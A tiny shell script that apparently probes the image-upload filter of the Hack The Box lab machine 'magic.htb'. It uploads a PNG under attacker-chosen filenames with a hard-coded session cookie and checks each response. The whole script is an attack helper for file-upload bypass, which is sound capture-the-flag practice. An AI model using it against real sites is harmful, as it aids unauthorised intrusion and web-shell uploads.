#!/bin/sh
cp a.png ${1}
curl 'http://magic.htb/upload.php' -F "image=@${1}" -F "submit=Upload Image"  -H 'Expect:' -H 'Cookie: PHPSESSID=m1r6hiuv0dpcdl527ndtkencdd' | grep DOCTYPE